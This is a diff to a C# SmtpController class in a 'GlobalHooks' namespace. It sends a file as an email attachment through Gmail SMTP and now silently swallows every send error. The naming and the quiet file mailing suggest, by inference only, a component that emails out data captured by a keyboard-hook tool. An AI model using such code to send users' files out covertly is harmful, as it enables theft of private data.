@@ -1,4 +1,5 @@
-﻿using System.Net.Mail;
+﻿using System;
+using System.Net.Mail;
 
 namespace GlobalHooks
 {
@@ -6,26 +7,37 @@ namespace GlobalHooks
     {
         private const string Host = "smtp.gmail.com";
         private const int Port = 587;
-        private readonly ConfigurationInfo _configuration;
+        private readonly string _from;
         private readonly SmtpClient _smtpClient;
+        private object _sendLock = new object();
 
-        public SmtpController(ConfigurationInfo configuration)
+        public SmtpController(string from, string password)
         {
-            _configuration = configuration;
+            _from = from;
             _smtpClient = new SmtpClient(Host, Port)
             {
-                Credentials = new System.Net.NetworkCredential(_configuration.From, _configuration.Password),
+                Credentials = new System.Net.NetworkCredential(_from, password),
                 EnableSsl = true
             };
         }
 
-        public void Send(string subject, string filePath)
+        public void Send(string subject, string filePath, string to)
         {
-            var mail = new MailMessage(_configuration.From, _configuration.To, subject, string.Empty);
-            using (var attachment = new Attachment(filePath))
+            lock (_sendLock)
             {
-                mail.Attachments.Add(attachment);
-                _smtpClient.Send(mail);
+                var mail = new MailMessage(_from, to, subject, string.Empty);
+                try
+                {
+                    using (var attachment = new Attachment(filePath))
+                    {
+                        mail.Attachments.Add(attachment);
+                        _smtpClient.Send(mail);
+                    }
+                }
+                catch (Exception)
+                {
+                    // ignored
+                }
             }
         }
     }
